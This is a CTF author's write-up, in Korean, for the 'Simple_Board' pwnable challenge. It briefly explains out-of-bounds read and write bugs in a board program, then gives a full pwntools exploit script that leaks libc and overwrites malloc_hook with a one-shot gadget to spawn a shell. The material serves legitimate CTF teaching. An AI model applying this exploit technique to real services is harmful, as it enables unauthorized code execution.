# WhiteHat League - Demon CTF

## Simple_Board Write-Up - 출제자 풀이

## Introduce

- Author : 이해찬 ( y0u_bat )
- Field : Pwnable
- E-Mail : y0u_bat@naver.com
- Data : 2017-09-12



## Intention

- Simple Board의 delete board 메뉴와 change board 메뉴에서 index를 검증하지 않아 OOB 취약점 존재.
- delete board 메뉴에서 OOB read를 하여 libc를 leak 할 수 있음.
- change board 메뉴에서 패스워드를 바꾸는 과정에서 OOB write가 가능하여 malloc_hook를 원샷 가젯으로 덮어서 쉘을 획득 할 수 있음.



## Solve.py

```Python
from pwn import *

context.log_level = 'debug'

HOST,PORT = '127.0.0.1',7777
s = remote(HOST,PORT)

def c_board_create(bname,bpw):
	s.sendline("1");
	s.recvuntil("board name : ")
	s.send(str(bname))
	s.recvuntil("board password : ")
	s.sendline(str(bpw))
	s.recvuntil("input: ")

def c_board_select(bname,):
	s.sendline("2")
	s.recvuntil("board_name : ")
	s.send(str(bname))
	s.recvuntil("input: ")

def c_board_delete(bid,bpw,ok):
	s.sendline("3")
	s.recvuntil("delete board id : ")
	s.sendline(str(bid))
	s.recvuntil("delete board pw (number) : ")
	s.sendline(str(bpw))

	s.recvuntil("board name is ")
	leak = s.recv(5)
	if s.recv(1) == "\x7f":
		leak += "\x7f\x00\x00"
		leak = u64(leak)
	s.recvuntil("Delete Y or N : ")
	s.send(str(ok))
	s.recvuntil("input: ")
	return leak

def c_board_change(bid,pw,new_name,new_pw):
	s.sendline("4")
	s.recvuntil("select board id : ")
	s.sendline(str(bid))
	s.recvuntil("select board pw (number) : ")
	s.sendline(str(pw))

	if new_name:
		s.recvuntil("change board name : ")
		s.send(str(new_name))
		s.recvuntil("change board password : ")
		s.sendline(str(new_pw))
		s.recvuntil("input: ")


def c_board_view():
	s.sendline("5")
	s.recvuntil("input: ")


def board_write(id_,content_):
	s.sendline("1")
	s.recvuntil("board id : ")
	s.send(str(id_))
	s.recvuntil("board content : ")
	s.send(str(content_))
	s.recvuntil("input: ")

def board_delete(id_):
	s.sendline("2")
	s.recvuntil("delete board id : ")
	s.sendline(str(id_))
	s.recvuntil("input: ")

def board_change(id_,content_):
	s.sendline("3")
	s.recvuntil("select board id : ")
	s.sendline(str(id_))
	s.recvuntil("change board_content : ")
	s.send(str(content_))
	s.recvuntil("input: ")

def board_view():
	s.sendline("4")
	s.recvuntil("input: ")

def back():
	s.sendline("5")
	s.recvuntil("input: ")
	
	
s.recvuntil("input: ")

c_board_create("test","123456789")

board_write("1","a"*30)

back()

libc_base = c_board_delete("-11","0","N")-0x3c5620
libc_malloc_hook_sub_10 = libc_base + 0x3C4B10-0x10
libc_malloc_hook = libc_base + 0x3C4B10
oneshot = libc_base + 0xF0274
c_board_create("test2","2222")
board_delete(str(libc_malloc_hook_sub_10))

back()

c_board_change("-4","0","\n",str(oneshot)) 

s.sendline("1")

log.info("libc_base : " + hex(libc_base))
log.info("libc_malloc_hook : " + hex(libc_malloc_hook))
s.interactive()
```
